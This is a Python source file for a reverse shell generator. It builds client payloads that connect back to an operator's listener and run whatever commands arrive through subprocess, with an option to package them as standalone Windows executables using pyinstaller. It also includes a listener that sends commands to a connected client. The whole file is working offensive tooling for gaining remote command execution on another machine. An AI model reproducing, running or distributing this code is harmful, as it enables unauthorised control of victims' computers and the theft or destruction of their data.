import socket 
import subprocess
import os
import shutil
import sys

global genClientCount
genClientCount = 1

def revshmain(callback):
    print("welcome to reverse shell generator")
    print("\n1. Generate tcp client")
    print("\n2. Connect to client")
    choice = input("Select: ")

    if choice == "1":
        genClient()
    elif choice == "2":
        connectClient()


def connectClient(): # need to fix
    socket_create()
    socket_bind()
    socket_accept()


#portp and hostp for listening
def socket_create():
    hostp = input("\nHost: ")
    portp = input("\nPort: ")
    try:
        global host
        global port
        global s
        host = hostp
        port = portp
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("socket create error: " + str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error: " + str(msg) + "\n" + "Retrying..")
        socket_bind()

def socket_accept():
    conn, addr = s.accept()
    print("Connection has been established | IP: " + addr[0] + " | Port: " + str(addr[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        command = input("CMD> ")

        if command == 'exit':
            conn.send('exit'.encode("UTF-8"))
            conn.close()
            s.close()
            sys.exit()
        if len(command.encode("UTF-8")) > 0:
            conn.send(command.encode("UTF-8"))
            client_resp = str(conn.recv(4092).decode("UTF-8"))
            print(client_resp, end="")


def genClient():
    global genClientCount

    addressc = input("\nEnter your listener address: ")
    while True:
        portInput = input("\nEnter your listener port: ")
        try:
            portc = int(portInput)
            break  
        except ValueError:
            print("Please enter a valid integer for the port.")

    while True:
        shellTrueorFalse = input("\nShell [y or n]: ").strip().lower()
        if shellTrueorFalse in ['y', 'n']:
            shellBool = True if shellTrueorFalse == "y" else False
            break
        else:
            print("Please enter 'y' or 'n'.")

    genClient_code = f"""
import socket
import subprocess

def genClient():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{addressc}", {portc}))
    
    while True:
        command = s.recv(4092).decode("UTF-8")
        if command == 'exit':
            break

        elif command.strip(): 
            CMD = subprocess.run(command, shell={shellBool}, capture_output=True)
            output = CMD.stdout + CMD.stderr
            s.send(output)

    s.close()

genClient()
"""

    pyorexe = input("\nGenerate an executable .py file[1] or .exe file[2]: ")
    fileName = f'tcpClient_{genClientCount}_.py'
    if pyorexe == "1":
        with open(fileName, 'w') as file:
            file.write(genClient_code)
        subprocess.run(['chmod', '+x', fileName])

    elif pyorexe == "2":
        with open(fileName, 'w') as file:
            file.write(genClient_code)
        result = subprocess.run(['pyinstaller', '--onefile', '--clean', fileName])

        if result.returncode == 0:
            # Move the generated executable and clean up
            if os.path.exists(f'dist/{os.path.splitext(fileName)[0]}.exe'):
                shutil.move(f'dist/{os.path.splitext(fileName)[0]}.exe', f'./{os.path.splitext(fileName)[0]}.exe')
                shutil.rmtree('dist')
                shutil.rmtree('build')
                os.remove(os.path.splitext(fileName)[0] + '.spec')
                os.remove(fileName)
                print("Executable file successfully created.")
                return
            else:
                print("Error: Failed to find generated executable.")
                return
        else:
            print("Failed to create executable file. Error output:")
            print(result.stderr)
            return

if __name__ == "__main__":
    global client_counter
    client_counter = 1 
    revshmain(None)